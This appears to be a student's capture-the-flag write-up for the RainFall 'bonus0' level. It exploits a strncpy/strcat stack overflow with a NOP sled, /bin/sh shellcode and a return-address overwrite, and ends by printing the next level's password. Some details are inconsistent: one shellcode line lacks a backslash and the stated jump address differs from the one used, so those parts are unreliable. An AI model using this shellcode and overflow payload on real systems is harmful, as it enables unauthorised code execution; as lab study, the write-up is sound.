# Bonus

- Once logged in, you will see a binary `bonus0`

```
[???]$ ssh localhost -p 4242 -l bonus0
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
bonus0@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
bonus0@RainFall:~$ ls
bonus0
bonus0@RainFall:~$
```

let's execute and see what this does

```
bonus0@RainFall:~$ ./bonus0
 -
a
 -
b
a b
bonus0@RainFall:~$ ./bonus0
 -
aa
 -
bbbbbbbbbbbbb
aa bbbbbbbbbbbbb
bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb�� bbbbbbbbbbbbbbbbbbbb��
Segmentation fault (core dumped)
```

this seems the program takes input, and prints out each input. but from the prompt of the last one, the output gives segmentation falult with lengthy input.

Let's take a deeper look into the program by using gdb.

From taking at the list of functions, there is a function p, pp, and main.
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x080484b4  p
0x0804851e  pp
0x080485a4  main
[...]
```

by analyzing the source code, we can see the the program ins using `strcpy(), strcat()`, which both are vulnerable for buffer overflow attack.

the program first calls function `pp`, and from function `pp` it calles `p` function.

From function `p`, it frist prints prints `" - "` on screen, and gets input with buffer size of 0x1000 from stdin. Once it copies into the buffer, if the buffer contains `newline; nl; '\n'`, it will set value where `\n` was placed into 0(=NULL; \0) and copies back 20 bytes back into first parameter of function.

by checking the output, the two buffers are stored next to each other. The strncpy() is call to copy the first 20 bytes. but on the man page,

```
 If stpncpy() does not terminate dst with a
     NUL character, it instead returns a pointer to dst[n] (which
     does not necessarily refer to a valid memory location.)
```

And as the buffer is next to each other, `strcat()` function will consider the second string as the part of the first string, since there is no `'\0'` is located in the first part of the buffer.

XXXXXXXXXXXXXXXXXXXXXXXXXXXX


Now we build the payload.

the first argument will consist with NOP instruction greater than 61 bytes and less than the buffer.

```
NOP * 100 + [shellcode]
"\x90" * 100 + "x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

then find the `buffer` address for beginning of buffer address + 61 and end of the NOP instruction

```
[----------------------------------registers-----------------------------------]
EAX: 0x4
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0xffffffff
EDX: 0xb7fd28b8 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbffff648 --> 0xbffff6a8 --> 0xbffff6f8 --> 0x0        <- beginning of the buffer
ESP: 0xbfffe630 --> 0x80486a0 --> 0x202d20 (' - ')
EIP: 0x80484d0 (<p+28>:	lea    eax,[ebp-0x1008])
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484c0 <p+12>:	mov    DWORD PTR [esp],eax
   0x80484c3 <p+15>:	call   0x80483b0 <puts@plt>
   0x80484c8 <p+20>:	mov    DWORD PTR [esp+0x8],0x1000
=> 0x80484d0 <p+28>:	lea    eax,[ebp-0x1008]
   0x80484d6 <p+34>:	mov    DWORD PTR [esp+0x4],eax
   0x80484da <p+38>:	mov    DWORD PTR [esp],0x0
   0x80484e1 <p+45>:	call   0x8048380 <read@plt>
   0x80484e6 <p+50>:	mov    DWORD PTR [esp+0x4],0xa
[------------------------------------stack-------------------------------------]
0000| 0xbfffe630 --> 0x80486a0 --> 0x202d20 (' - ')
0004| 0xbfffe634 --> 0x0
0008| 0xbfffe638 --> 0x1000
0012| 0xbfffe63c --> 0x0
0016| 0xbfffe640 --> 0x0
0020| 0xbfffe644 --> 0x0
0024| 0xbfffe648 --> 0x0
0028| 0xbfffe64c --> 0x0
[------------------------------------------------------------------------------]
```

```
Choose an address between 0xbfffe640 + 61 (0xbfffe67d) and 0xbfffe640 + 100 (0xbfffe6a4) => 0xbfffe640 (\xd0\xe6\xff\xbf)
```

the exploit will be following

```
python -c 'print "\x90" * 100 + "x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
```
```
python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'
```

```
(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
```

```
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\x86\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 -
 -
��������������������AAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
ls
ls: cannot open directory .: Permission denied
cat /home/users/bonus1/.pass
cat: /home/users/bonus1/.pass: No such file or directory
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
